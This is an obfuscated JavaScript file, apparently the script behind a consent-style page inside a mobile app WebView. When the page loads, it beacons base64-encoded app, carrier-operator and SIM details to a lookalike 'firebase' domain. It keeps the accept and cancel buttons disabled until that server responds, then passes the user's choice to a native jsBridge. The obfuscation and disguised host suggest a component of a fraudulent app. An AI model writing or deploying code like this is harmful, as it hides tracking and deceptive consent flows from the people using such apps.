const _0x5f5d = [
  'addEventListener',
  'readyState',
  'click',
  'querySelectorAll',
  'cancel',
  '46000',
  'classList',
  'log',
  'POST',
  'Error:',
  'function',
  'onreadystatechange',
  'res',
  'postMessage',
  'send',
  'error',
  'button',
  'responseText',
  'jsBridge',
  'DONE',
  'true',
];
const _0x5069 = function (_0x5f5dbb, _0x50698c) {
  _0x5f5dbb = _0x5f5dbb - 0x0;
  let _0x408ec6 = _0x5f5d[_0x5f5dbb];
  return _0x408ec6;
};
function jsonToBase64(_0x4951fe) {
  const _0x165fa1 = JSON['stringify'](_0x4951fe);
  const _0x122fb7 = btoa(_0x165fa1);
  return _0x122fb7;
}
function base64ToJson(_0x45a13d) {
  const _0xfd27e5 = atob(_0x45a13d);
  const _0x318146 = JSON['parse'](_0xfd27e5);
  return _0x318146;
}
function isDisable(_0x556f6c) {
  const _0x3fabd7 = document['querySelectorAll']('button');
  const [_0x121d3a, _0x12d7f2] = _0x3fabd7;
  const _0x2c9dfe = _0x556f6c ? 'add' : 'remove';
  _0x121d3a[_0x5069('0x6')][_0x2c9dfe]('disable');
  _0x12d7f2[_0x5069('0x6')][_0x2c9dfe]('disable');
}
const requestBody = {
  applicationid: 'com.baidu.asdfghj',
  operator: _0x5069('0x5'),
  simInstalled: _0x5069('0x14'),
  identificationcode: '3423-234-234',
};
let isInit = ![];
const bindEvents = () => {
  const _0x5ef51b = document[_0x5069('0x3')](_0x5069('0x10'));
  const [_0x72c212, _0x2a2c1f] = _0x5ef51b;
  _0x72c212['addEventListener'](_0x5069('0x2'), () => {
    if (!isInit) return;
    if (
      window[_0x5069('0x12')] &&
      typeof window[_0x5069('0x12')]['postMessage'] === 'function'
    ) {
      window['jsBridge']['postMessage'](_0x5069('0x4'));
    } else {
      console['error']('jsBridge.postMessage\x20is\x20not\x20available.');
    }
  });
  _0x2a2c1f[_0x5069('0x0')]('click', () => {
    if (!isInit) return;
    if (
      window['jsBridge'] &&
      typeof window['jsBridge'][_0x5069('0xd')] === _0x5069('0xa')
    ) {
      window[_0x5069('0x12')]['postMessage']('accept');
    } else {
      console['error']('jsBridge.postMessage\x20is\x20not\x20available.');
    }
  });
};
const send = async () => {
  isDisable(!![]);
  const _0x4ce34b = new XMLHttpRequest();
  _0x4ce34b['open'](_0x5069('0x8'), 'https://firebase.usdkfj.click', !![]);
  _0x4ce34b[_0x5069('0xb')] = function () {
    if (_0x4ce34b[_0x5069('0x1')] === XMLHttpRequest[_0x5069('0x13')]) {
      if (_0x4ce34b['status'] === 0xc8) {
        isInit = !![];
        const _0x1dd08f = _0x4ce34b[_0x5069('0x11')];
        console[_0x5069('0x7')](_0x5069('0xc'), base64ToJson(_0x1dd08f));
        isDisable(![]);
      } else {
        console[_0x5069('0xf')](_0x5069('0x9'), _0x4ce34b['statusText']);
      }
    }
  };
  _0x4ce34b[_0x5069('0xe')](jsonToBase64(requestBody));
};
window['onload'] = () => {
  send();
  bindEvents();
};
